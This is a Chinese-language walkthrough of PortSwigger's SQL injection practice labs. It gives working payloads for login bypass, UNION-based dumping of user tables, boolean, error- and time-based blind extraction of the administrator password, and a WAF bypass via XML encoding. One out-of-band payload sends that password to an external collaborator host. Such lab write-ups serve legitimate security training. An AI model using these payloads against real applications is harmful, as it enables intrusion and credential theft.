# 1. **burp靶场介绍**

~靶场有点类似于常见的`DVWA靶场`、`piachu靶场`，里面富含多种不同类型的漏洞，并且每个靶场都有针对性，例如`sql注入`，从最简单的判断开始，逐步的增加难度，并且每一个靶场都附带介绍以及通过方式，能够让新人快速的了解原理并且针对性练习。

## 1.1. **访问靶场**

靶场链接：[所有实验室|网络安全学院 (portswigger.net)](https://portswigger.net/web-security/all-labs)

# 2. **SQL注入靶场**

## 2.1. **注意事项**

在正常测试后相关性都是使空格进行分隔，例如：`order by 1--`，但是在部分浏览器中可能需要用加号替代空格。例如：`order+by+1--`。我使用火狐浏览器就存在这样的异常，后来使用`Edge浏览器`的时候没出现，可能火狐浏览器没有对输入的内容进行编码转换。

所以下面的操作后存在存在添加`+`号替换空格也可能存在未添加，自行分辨，并非是过滤绕过。同时部分通过方式需要使用靶场指定的参数进行通过，可能也是避免别人攻击网站吧。

## 2.2. **检索隐藏数据**

请执行 `SQL` 注入攻击，使应用程序显示任何类别（已发布和未发布）中所有产品的详细信息。

### 2.2.1. **开启靶场**

我这里是自动进行翻译的，点击下面的访问实验室即可，稍等以下即可进入靶场，在下面的翻译为溶液的一栏中会有解决办法。

![图片1](assets/%E5%9B%BE%E7%89%871.png) 

### 2.2.2. **点击礼物**

这里点击礼物后，可以观察以下URL，同时可以看到在页面中只有3个物品。

![图片 2](assets/%E5%9B%BE%E7%89%87%202.png) 

 

### 2.2.3. **测试类型**

通过观察URL中能够看到，有点像原理中提到的?id=XX这样，那么这里是不是可以作为注入点，那么这里就可以对其进行测试了，可以测试是字符型还是数字型，这里经过测试是字符型使用单引号进行闭合，同时输入后发现出现了隐藏的物品，但是并没有过关。

```
payload：'--
```

![图片 3](assets/%E5%9B%BE%E7%89%87%203.png)

### 2.2.4. **爆出全部物品(包括隐藏)**

这里知道闭合的单引号了，那么可以直接'+or+1=1--直接让所有的物品已经隐藏物品全部爆出来。这里使用+是因为编码，如果空格的话就需要编码，所有直接使用+，同时在这个靶场中，使用空格好像识别不出来。

成功后就会提示过关，如果使用空格可能会出现过不了关的情况。

```
payload：'+or+1=1--
```

![图片 4](assets/%E5%9B%BE%E7%89%87%204.png) 

## 2.3. **登录逻辑**

请执行以用户身份登录到应用程序的 SQL 注入攻击。简单来说就是通过sql注入让其能够登录管理员账号。

### 2.3.1. **开启靶场**

![图片 5](assets/%E5%9B%BE%E7%89%87%205.png) 

### 2.3.2. **登录账户**

这里我们使用`administrator`进行登录的时候，正常情况下是无法登录的。那么这里是否可以将后面密码验证注释掉？

![图片 6](assets/%E5%9B%BE%E7%89%87%206.png) 

### 2.3.3. **注释验证**

我们使用`administrator'--`进行注入，关于是使用字符型还是数字型自行测试，测试方式也挺简单的，至于密码，我们的思路是绕过验证，那么密码就随便输入一些内容。

```
payload：administrator'--
```

![图片 7](assets/%E5%9B%BE%E7%89%87%207.png) 

### 2.3.4. **成功登陆**

通过绕过验证，成功登录账户，同时页面也提示我们成功过关。

![图片 8](assets/%E5%9B%BE%E7%89%87%208.png) 

## 2.4. **判断列**

这里其实就是通过执行返回包含 `null` 值的附加行的 `SQL`注入`UNION`攻击来确定查询返回的列数。

### 2.4.1. **开启靶场**

![图片 9](assets/%E5%9B%BE%E7%89%87%209.png) 

### 2.4.2. **点击分类**

这里选择一个分类进行测试，这里我点击宠物分类。

![图片 10](assets/%E5%9B%BE%E7%89%87%2010.png) 

### 2.4.3. **测试列**

测试列需要使用`order by null`进行测试。这里的测试正常的思路是先测试闭合类型，然后使用`order by从1一`直测试到无显示为止。那么这里我测试后是单引号闭合，直接就测试无回显是到多少。

#### 2.4.3.1. **无回显**

这里测试到4的时候就出现无回显，那么证明是存在3列的。

```
payload：' order by 4--
```

![图片 11](assets/%E5%9B%BE%E7%89%87%2011.png) 

#### 2.4.3.2. **有回显**

这里忽略我通关的显示，由于图片是后补的，所以显示这样，实质上在这步并非通过。

```
payload：' order by 3--
```

![图片 12](assets/%E5%9B%BE%E7%89%87%2012.png) 

### 2.4.4. **过关**

这关想要过关是需要使用`union select null`进行测试的，之前使用`order by`只是测试出这里需要几个`null`，那么我们测试后需要使用到3个，那么输入3个null即可过关。

```
payload：' union select null,null,null--
```

![图片 13](assets/%E5%9B%BE%E7%89%87%2013.png) 

## 2.5. **判断字段位置**

这里就是通过之前获取到三列，来进行判断哪一列能够返回值。

### 2.5.1. **开启靶场**

![图片 14](assets/%E5%9B%BE%E7%89%87%2014.png) 

### 2.5.2. **替换值位置**

这里需要使用官方提供的值进行输入，不是输入1234这样的内容，在页面的上面会显示这个字符串，这里后面我们使用字符串的时候需要使用引号，避免识别不出来。

![图片 15](assets/%E5%9B%BE%E7%89%87%2015.png) 

#### 2.5.2.1. **第一个位置**

当将页面中提供的字符串放置第一个位置的时候，就会存在报错，证明位置并非正确。

```
payload：' union select 'O6chxH',null,null--
```

![图片 16](assets/%E5%9B%BE%E7%89%87%2016.png) 

#### 2.5.2.2. **第二个位置**

当将页面中提供的字符串放置第二个位置的时候，页面出现过关通知，那么就证明字符串放对位置了。

```
payload：' union select null,'O6chxH',null--
```

![图片 17](assets/%E5%9B%BE%E7%89%87%2017.png) 

## 2.6. **从其它表检索数据**

请执行 `SQL`注入`UNION`攻击，该攻击检索所有用户名和密码，并使用这些信息以用户身份登录，`administrator`。

### 2.6.1. **开启靶场**

![图片 18](assets/%E5%9B%BE%E7%89%87%2018.png) 

### 2.6.2. **测试列数**

这里需要先测试列数，然后结合前面学习的如何变成一个流程下来，进行执行。

这里测试的列数是2，到3的时候出现报错了。

```
payload：order by 3--
```

![图片 19](assets/%E5%9B%BE%E7%89%87%2019.png) 

### 2.6.3. **爆出账号密码**

这里是根据题目的提示是存在`username`与`password`，并且是从`users`表中获得。

这里不在确定字段位置是因为只用两个字段，并且官方已经提示了，就不进行测试了。

```
payload：' union select username,password from users--
```

![图片 20](assets/%E5%9B%BE%E7%89%87%2020.png) 

### 2.6.4. **过关**

这里我们获取到账号和密码后，进行登录，登录后就会在页面中显示过关的提示。

![图片 21](assets/%E5%9B%BE%E7%89%87%2021.png) 

## 2.7. **从单列中获取多个字段**

之前我们都是一列获取一个字段，这里需要我们通过一个列中获取多个字段的内容。

### 2.7.1. **开启靶场**

![图片 22](assets/%E5%9B%BE%E7%89%87%2022.png) 

### 2.7.2. **测试靶场**

这里经过测试是两列，至于如何测试出是两列，这里就不在复述了，跟着流程下来，这里应该也会测试了。

#### 2.7.2.1. **测试失败**

这里通过介绍是有username与password，并且是从users中读取出来，我们进行测试。

通过测试，发现我们之前输入的payload的无法把账号和密码带出。重新看介绍，是需要我们将账号密码合并带出。

```
payload：' union select username,password from users--
```

![图片 23](assets/%E5%9B%BE%E7%89%87%2023.png) 

#### 2.7.2.2. **再次失败**

我们将需要带出的值合并放入第一位，进行测试。这里经过测试，依旧是错误的，我们就需要考虑换一个位置。

不同数据库字符串的连接方法：

```
Oracle: 'foo'||'bar'

SQL Server: 'foo'+'bar'

Mysql: 'foo' 'bar'（空格） CONCAT('foo','bar')

PostgreSQL: 'foo'||'bar'
```

```
payload：' union select username||'~'||password,null from users--
```

![图片 24](assets/%E5%9B%BE%E7%89%87%2024.png) 

#### 2.7.2.3. **测试成功**

这里我们替换了一个位置，成功爆出账户密码。

```
payload：' union select null,username||'~'||password from users--
```

![图片 25](assets/%E5%9B%BE%E7%89%87%2025.png) 

### 2.7.3. **过关**

这里只需要把获取到的账户和密码进行登录即可过关。

![图片 26](assets/%E5%9B%BE%E7%89%87%2026.png) 

## 2.8. **Oracle数据库版本**

这里就是查看数据库版本，当然不同的数据库有不同的查询方式。

各数据库查询版本语句：

```
Mysql     SELECT version()

Sql Server  SELECT @@version

Oracle    SELECT * FROM v$version

Postgre    SELECT version()
```



### 2.8.1. **开启靶场**

![图片 27](assets/%E5%9B%BE%E7%89%87%2027.png) 

### 2.8.2. **判断数据库类型**

这里虽然我们知道是Oracle 数据库，但是我们还是需要进行数据库判断，在Oracle 数据库中存在一个dual表，这个表是Oracle 数据库中自带的一张表。这里我们就可以通过这个自带表进行判断。

```
payload：'union select null,null from dual--
```

![图片 28](assets/%E5%9B%BE%E7%89%87%2028.png) 

### 2.8.3. **查看数据版本**

这里在判断数据库类型后，就需要查看数据的版本了，根据之前给的提示进行就可以对数据库的版本进行判断了。

同时判断出来后，页面也会提示我们过关了。

```
payload：'union select banner,null from version--
```

![图片 29](assets/%E5%9B%BE%E7%89%87%2029.png) 

## 2.9. **Mysql数据库版本**

这里需要判断的是mysql数据库的版本了。

### 2.9.1. **开启靶场**

![图片 30](assets/%E5%9B%BE%E7%89%87%2030.png) 

### 2.9.2. **查看数据库版本**

这里就不去前边的判断了，直接查看数据库的版本，这里依旧是两列。

```
payload：' union select null,version()-- k
```

后面的-- k 的k可以随便输入，这个是为了让注释能够成功。

![图片 31](assets/%E5%9B%BE%E7%89%87%2031.png) 

## 2.10. **列出非Oracle数据库上的内容**

这里就是通过完整的流程来获取账户和密码。

### 2.10.1. **开启靶场**

![图片 32](assets/%E5%9B%BE%E7%89%87%2032.png) 

### 2.10.2. **查询所有表**

这里就不进行前面的注入类型以及列的判断了，这里还是字符型以及两列。查询所有表，使用自带的information_schema。

```
payload：' union select table_name,null from information_schema.tables--
```

通过查询表能够看到，这里是把所有表都列出来了。

![图片 33](assets/%E5%9B%BE%E7%89%87%2033.png) 

### 2.10.3. **查询所有字段**

这里会有很多的表，在正常测试的情况下，不确定的情况下，需要寻找关键字然后进行查找。

注意这里的表，bp靶场生成的时候是不同的，需要替换表。

```
payload：' union select column_name,null from information_schema.columns where table_name='users_cgnxjc'--
```

![图片 34](assets/%E5%9B%BE%E7%89%87%2034.png) 

### 2.10.4. **爆出账户密码**

这里我们获取到账户和密码的字段后，就可以进行数据的获取了。

```
payload：' union select username_qbizva,password_danmjm from users_cgnxjc--
```

![图片 35](assets/%E5%9B%BE%E7%89%87%2035.png) 

### 2.10.5. **过关**

将获取到的账户密码进行登录，即可过关。

![图片 36](assets/%E5%9B%BE%E7%89%87%2036.png) 

## 2.11. **列出Oracle数据库上的内容**

这里和上个靶场类似。

### 2.11.1. **开启靶场**

![图片 37](assets/%E5%9B%BE%E7%89%87%2037.png) 

### 2.11.2. **判断列**

这里在判断列的时候需要在后面添加from dual，不然一直显示错误。

```
payload：' union select null,null from dual--
```

![图片 38](assets/%E5%9B%BE%E7%89%87%2038.png) 

### 2.11.3. **查询所有表**

这里依旧是对其进行查询所有表。

```
payload：' union select table_name,null from all_tables--
```

![图片 39](assets/%E5%9B%BE%E7%89%87%2039.png) 

### 2.11.4. **查询所有字段**

这里只能靠经验判断账户密码保存在什么那个表中了，正常都是users这些。可以去找一找。

```
payload：' union select column_name,null from all_tab_columns where table_name='USERS_YDSHJO'--
```

![img](assets/%E5%9B%BE%E7%89%87%2040.png) 

### 2.11.5. **爆出账户密码**

这里通过爆出的字段然后去查询以下字段中的数据。

```
payload：' union select USERNAME_VKPLRN,PASSWORD_FLAGFE from USERS_YDSHJO--
```

![img](assets/%E5%9B%BE%E7%89%87%2041.png) 

### 2.11.6. **过关**

这里把获取到的账户密码进行登录就可以过关了。

![img](assets/%E5%9B%BE%E7%89%87%2042.png) 

## 2.12. **具有条件反应的SQL盲注**

根据目标提示，SQL注入存在Cookie中，查询成功有Welcome back的回显但没有数据的回显，给了表和字段，让我们查到administrator用户的账号密码。

### 2.12.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2043.png) 

### 2.12.2. **判断注入点**

这里告诉我们是在cookie值位置，那么我们就在cookie值位置进行sql注入的测试。

#### 2.12.2.1. **正常**

正常情况下会显示Welcome back。

```
payload：' and 1=1--
```

![img](assets/%E5%9B%BE%E7%89%87%2044.png) 

#### 2.12.2.2. **非正常**

而非正常的情况下是不会出现Welcome back。

```
payload：' and 1=2--
```

![img](assets/%E5%9B%BE%E7%89%87%2045.png) 

### 2.12.3. **判断是否存在users表**

这里就需要判断是否存在users的表。

```
payload：' and (select 'cs' from users limit 1) ='cs'--
```

![img](assets/%E5%9B%BE%E7%89%87%2046.png) 

### 2.12.4. **判断是否存在administrator用户**

```
payload：' and (select 'cs' from users where username='administrator')='cs'--
```

![img](assets/%E5%9B%BE%E7%89%87%2047.png) 

### 2.12.5. **判断密码长度**

```
payload：' and (select 'cs' from users where username='administrator' and Length(password)>1)='cs'--
```

经过测试1是成立的，而我们需要判断密码是多少位。

![img](assets/%E5%9B%BE%E7%89%87%2048.png) 

#### 2.12.5.1. **设置爆破密码长度**

选中其中的1，然后设置1到30即可，当然也可以设置更长。

![img](assets/%E5%9B%BE%E7%89%87%2049.png) 

![img](assets/%E5%9B%BE%E7%89%87%2050.png) 

#### 2.12.5.2. **获取密码长度**

这里通过返回的长度发现，到20的时候出现变化，那么判断密码长度为20位。

![img](assets/%E5%9B%BE%E7%89%87%2051.png) 

### 2.12.6. **爆破密码**

```
payload：' and (select substring(password,1,1) from users where username='administrator')='a'--
```



#### 2.12.6.1. **设置爆破字段**

在password后面的1是控制长度，而后面的a是测试的密码中单个字母或数字。

![img](assets/%E5%9B%BE%E7%89%87%2052.png) 

#### 2.12.6.2. **设置爆破参数**

payload1：

![img](assets/%E5%9B%BE%E7%89%87%2053.png) 

payload2：

这里添加0到9，小写a到z，大写A到Z

![img](assets/%E5%9B%BE%E7%89%87%2054.png) 

### 2.12.7. **查看密码**

密码是由payload1来定义的，假如payload1后面的1是e，payload1后面2是i，那么密码就是ei，由于攻击完后，顺序是乱的，需要自行排序。

```
密码：1s4hm9hq7dok4d0mpbkb
```

![img](assets/%E5%9B%BE%E7%89%87%2055.png) 

### 2.12.8. **过关**

这里我成功进入了，但是由于页面问题可能没加载出过关的通知，后面去页面中查看确实是过关了。

![img](assets/%E5%9B%BE%E7%89%87%2056.png) 

## 2.13. **具有条件误差的SQL盲注**

这里和第十二题一样都是在cookie处存在注入点。

### 2.13.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2057.png) 

### 2.13.2. **判断注入情况**

这里通过注入的情况，来判断是否存在注入。

#### 2.13.2.1. **有异常**

加一个单引号会引发报错。

```
payload：'
```

![img](assets/%E5%9B%BE%E7%89%87%2058.png) 

#### 2.13.2.2. **无异常**

加两个引号，也就是将前面的引号闭合，若页面正常，证明带入数据库中了，那么也就证明存在注入。

```
payload：''
```

![img](assets/%E5%9B%BE%E7%89%87%2059.png) 

### 2.13.3. **判断数据库**

这里通过不同的方式来判断是什么数据库。

#### 2.13.3.1. **判断是否为mysql数据库**

这里报错了，那么证明不是mysql数据库。

```
payload：' || (select '') || '
```

![img](assets/%E5%9B%BE%E7%89%87%2060.png) 

#### 2.13.3.2. **判断是否为**Oracle数据库

这里可以看到页面是正常的，那么就可以证明是oracle数据库。

```
payload：'||(select '' from dual)||'
```

![img](assets/%E5%9B%BE%E7%89%87%2061.png) 

### 2.13.4. **判读是否存在users表**

这里页面正常，证明是存在users表的。

```
 WHERE ROWNUM = 1 用于限定仅仅返回一行数据
```

```
payload：'||(select case when (1=2) then to_char(1/0) else '' end from users where rownum = 1)||'
```

![img](assets/%E5%9B%BE%E7%89%87%2062.png) 

### 2.13.5. **判断是否存在administrator用户**

通过页面返回正常，可以看出是存在administrator用户的。

```
payload：'||(select case when (1=2) then to_char(1/0) else '' end from users where username='administrator')||'
```

![img](assets/%E5%9B%BE%E7%89%87%2063.png) 

### 2.13.6. **判断密码位数**

通过测试，得出密码有20位。

```
payload：'||(select case when length(password)>1 then+to_char(1/0) else '' end from users where username='administrator')||'
```

![img](assets/%E5%9B%BE%E7%89%87%2064.png) 

### 2.13.7. **爆破密码**

这里的操作和第十二关是一样的操作，这里就直接进行爆破了。

```
payload：'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
```

```
密码：v49z9t6xecxca6zokl3e
```

![img](assets/%E5%9B%BE%E7%89%87%2065.png) 

### 2.13.8. **过关**

这里依旧是使用这个火狐渗透版，不显示过关信息，但是确实是过关完成了。

![img](assets/%E5%9B%BE%E7%89%87%2066.png) 

## 2.14. **具有时间延迟的SQL盲注**

这里通过返回的时间来判断注入是否正确。

### 2.14.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2067.png) 

### 2.14.2. **延迟10秒**

```
payload：'||pg_sleep(10)--
```

![img](assets/%E5%9B%BE%E7%89%87%2068.png) 

### 2.14.3. **过关**

这里要注意，靶场要求要延迟10秒才能过关。

![img](assets/%E5%9B%BE%E7%89%87%2069.png) 

## 2.15. **时间SQL盲注与信息检索**

这里需要使用延迟进行注入进行判断，由于太耗时间，就直接上语句，不在一个一个测试了。

### 2.15.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2070.png) 

### 2.15.2. **语句测试**

```
延时，%3B为分号URL编码，使得cookie查询执行后，执行SQL 

验证语句：'%3bselect+case+when+(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end--

判断是否存在administrator用户：'%3bselect+case+when+(username='administrator')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--
```

### 2.15.3. **判断密码长度**

这里是10秒，我就测试到21位，因为肯定是20位，这里需要耐心等等，很慢的。这里有个问题就是可能会存在误差，所以还是需要注意。

```
payload：'%3bselect+case+when+(username='administrator'+and+length(password)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--
```

### 2.15.4. **判断密码**

这里还是使用之前的方式进行爆破。需要注意，时间比较长，而且如果把延迟的时间降低，可能会存在不准确的情况，误差比较大，这里还需要设置单线程，否则也会出现误报的情况。

```
payload：'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='a')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--
```

```
密码：73zzf59k8gssdrv2nr8i
```

![img](assets/%E5%9B%BE%E7%89%87%2071.png) 

#### 2.15.4.1. **接受响应时间**

这里可以通过调整列显示接受响应时间。

![img](assets/%E5%9B%BE%E7%89%87%2072.png) 

#### 2.15.4.2. **设置单线程**

把这里改成1就好了。

![img](assets/%E5%9B%BE%E7%89%87%2073.png) 

### 2.15.5. **过关**

![img](assets/%E5%9B%BE%E7%89%87%2074.png) 

## 2.16. **带外交互的盲SQL注入**

这里就是需要通过外带的方式进行sql注入，这里我并未过关，自行测试哦，可能我的环境有点问题吧。

### 2.16.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2075.png) 

### 2.16.2. **获取公用服务器**

这里使用burp软件中自带的服务器地址。

#### 2.16.2.1. **打开客户端**

![img](assets/%E5%9B%BE%E7%89%87%2076.png) 

#### 2.16.2.2. **获取服务器地址**

![img](assets/%E5%9B%BE%E7%89%87%2077.png) 

### 2.16.3. **构建payload**

这里我并未获取到相关的信息，也并未过关，这里不知道是什么情况，为何数据获取不到，原先觉得是不是payload有问题，后来看觉得应该不是payload的问题，这里就把payload先放在这里把。

```
payload：'+union+select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"utf-8"%3f><!doctype+root+[+<!entity+%25+remote+system+"http%3a//l4q1opz0kdkuzw12pbutkgzuslybm0.burpcollaborator.net/">+%25remote%3b]>'),'/l')+from+dual--
```

![img](assets/%E5%9B%BE%E7%89%87%2078.png) 

## 2.17. **带外数据泄漏的盲SQL注入**

这里就是通过服务器将数据带出，当然这里是配合类似xxe攻击的手段配合带出，同样这里我也并未成功，始终获取不到数据。

这里也是自行测试。

```
payload：'+union+select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"utf-8"%3f><!doctype+root+[+<!entity+%25+remote+system+"http%3a//'||(select+password+from+users+where+username%3d'administrator')||'bcrx9myq17bpdz9gk83ym0u01r7hv6.burpcollaborator.net/">+%25remote%3b]>'),'/l')+from+dual--
```

![img](assets/%E5%9B%BE%E7%89%87%2079.png) 

## 2.18. **通过XML编码绕过过滤器的SQL注入**

### 2.18.1. **开启靶场**

![img](assets/%E5%9B%BE%E7%89%87%2080.png) 

### 2.18.2. **点击页面**

这里看页面其实什么都没有，只有view details的按钮，那么这里我们就点击进去看看有什么东西。

![img](assets/%E5%9B%BE%E7%89%87%2081.png) 

### 2.18.3. **发现新大陆**

这里点进去发现了新的按钮。

![img](assets/%E5%9B%BE%E7%89%87%2082.png) 

### 2.18.4. **抓包**

这里我们发现下面的内容像xml代码，那么是不是可以修改代码。

![img](assets/%E5%9B%BE%E7%89%87%2083.png) 

### 2.18.5. **测试注入点**

这里我们就需要测试注入点了，原来是1，那么可以尝试修改数值，我们修改成2呢，再测试是否存在数学表达式替换ID，然后观察。

#### 2.18.5.1. **数值为1的状态**

没有延迟正常。

![img](assets/%E5%9B%BE%E7%89%87%2084.png) 

#### 2.18.5.2. **数值为2的状态**

当数值为2的时候，同样没有延迟。

![img](assets/%E5%9B%BE%E7%89%87%2085.png) 

### 2.18.6. **测试是否存在数学表达式替换ID**

```
使用<storeId>1+1<storeId>,成功查到<storeId>2<storeId>的结果.
```

![img](assets/%E5%9B%BE%E7%89%87%2086.png) 

### 2.18.7. **测试联合注入**

在后面添加UNION SELECT NULL，发现被waf检测到了。那么是不是可以使用编码绕过？？

![img](assets/%E5%9B%BE%E7%89%87%2087.png) 

#### 2.18.7.1. **编码绕过**

这里使用html编码绕过。

![img](assets/%E5%9B%BE%E7%89%87%2088.png) 

#### 2.18.7.2. **成功绕过**

可以看到这里我们成功绕过了。

![img](assets/%E5%9B%BE%E7%89%87%2089.png) 

### 2.18.8. **获取密码**

这里同样进行编码绕过

```
payload：union select username || ':' || password from users

payload编码： UNION SELECT username || ':' || password FROM users
```

```
密码：b64ddknath9swz8u68fd
```

![img](assets/%E5%9B%BE%E7%89%87%2090.png) 

### 2.18.9. **过关**

将获取到的密码，进行登录即可过关。

![img](assets/%E5%9B%BE%E7%89%87%2091.png) 

 

 
